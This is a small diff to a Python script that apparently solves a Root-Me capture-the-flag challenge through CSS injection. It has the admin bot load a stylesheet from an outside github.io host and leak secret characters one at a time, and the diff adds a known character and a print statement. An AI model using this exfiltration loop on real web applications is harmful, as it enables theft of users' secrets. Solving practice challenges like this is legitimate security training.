@@ -87,7 +87,7 @@ def build_css(chars):
 
 # ----
 chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-know  = "ru"
+know  = "ruW"
 
 # envoie à admin 
 while 1:
@@ -104,5 +104,6 @@ while 1:
         sleep(10) # for not to ban
         data = {"url":"http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a"}
         r = requests.post("http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a", data=data)
+        print(r)
         requests.post("http://challenge01.root-me.org:58005/?style=light", data=data)
         know += input("new chars to know : ")
